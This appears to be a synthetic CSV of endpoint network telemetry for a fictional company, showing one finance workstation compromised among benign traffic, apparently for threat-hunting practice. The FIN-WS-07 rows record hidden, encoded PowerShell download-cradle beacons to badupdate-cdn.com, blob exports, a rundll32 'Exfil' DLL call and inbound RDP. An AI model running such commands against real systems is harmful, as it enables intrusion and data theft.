TimeGenerated,DeviceName,DeviceId,ActionType,LocalIP,LocalPort,RemoteIP,RemoteIPType,RemotePort,RemoteUrl,Protocol,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessFolderPath,ReportId
2026-06-10T09:38:50Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ConnectionSuccess,10.20.5.42,51402,52.170.12.45,Public,443,contoso.sharepoint.com,Tcp,meganb,meganb@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,C:\Program Files (x86)\Microsoft\Edge\Application\,5201402
2026-06-10T09:40:27Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50057,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202450
2026-06-10T09:45:29Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50066,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202510
2026-06-10T09:50:31Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50075,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202570
2026-06-10T09:55:33Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50084,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202630
2026-06-10T10:00:14Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50093,52.239.130.20,Public,443,stcontosofin.blob.core.windows.net,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -c ""Get-AzStorageBlob -Container exports | Get-AzStorageBlobContent""",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202700
2026-06-10T10:00:36Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50101,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202706
2026-06-10T10:05:36Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50110,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202760
2026-06-10T10:18:44Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50140,52.239.130.20,Public,443,stcontosofin.blob.core.windows.net,Tcp,alexw,alexw@contoso.com,azcopy.exe,"azcopy.exe copy ""C:\Users\alexw\AppData\Local\Temp\fin_export.7z"" ""https://stcontosofin.blob.core.windows.net/exports?sig=REDACTED""",powershell.exe,C:\Users\alexw\AppData\Local\Temp\,5202844
2026-06-10T10:20:09Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50148,91.219.236.18,Public,8080,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\update.dll,Exfil",powershell.exe,C:\Windows\System32\,5202850
2026-06-10T10:20:55Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50149,91.219.236.18,Public,8080,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\update.dll,Exfil",powershell.exe,C:\Windows\System32\,5202858
2026-06-10T10:21:40Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,InboundConnectionAccepted,10.20.7.31,3389,185.220.101.2,Public,52114,,Tcp,alexw,alexw@contoso.com,svchost.exe,svchost.exe -k termsvcs,services.exe,C:\Windows\System32\,5202890
2026-06-10T10:32:18Z,DC01,c2c2c2c2-1111-2222-3333-000000000001,ConnectionSuccess,10.20.1.10,52280,20.98.111.30,Public,443,login.microsoftonline.com,Tcp,svc-backup,svc-backup@contoso.com,powershell.exe,"powershell.exe -File C:\Scripts\NightlyBackup.ps1",svchost.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5203018
2026-06-10T10:41:02Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ConnectionSuccess,10.20.5.42,51560,52.170.12.45,Public,443,outlook.office365.com,Tcp,meganb,meganb@contoso.com,olk.exe,"""C:\Program Files\Microsoft Office\root\Office16\olk.exe""",explorer.exe,C:\Program Files\Microsoft Office\root\Office16\,5201560
